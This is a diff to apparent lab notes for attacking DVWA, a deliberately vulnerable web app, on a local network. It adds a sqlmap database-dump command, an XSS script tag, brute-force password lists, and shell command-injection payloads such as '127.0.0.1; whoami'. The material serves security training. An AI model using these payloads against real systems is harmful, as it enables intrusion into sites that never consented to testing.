@@ -12,8 +12,45 @@
 Find IP of DVWA:
 ip a / ip confg
 
-SQL Injection automation:
+*SQL Injection automation:
 sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<yourid>" --dump
 
-Manual XSS payload:
+*Manual XSS payload:
 <script>alert(1)</script>
+
+*Broken Access Control – Brute Force
+Tools Used
+
+Burp Suite Intruder
+
+Kali Linux
+
+Technique Demonstrated
+
+Lack of rate limiting on authentication endpoint allowed unlimited password attempts.
+
+Payload Type
+
+Numeric & common password lists
+
+Example Intruder Payload
+admin
+123456
+password
+admin@123
+
+*Command Injection (Ping Demonstration)
+##Tools Used
+
+Burp Suite
+
+Kali Linux Terminal
+
+Payloads Used
+127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | uname -a
+127.0.0.1; ping -c 4 127.0.0.1
+
+
+Successful ping responses confirmed OS command execution.
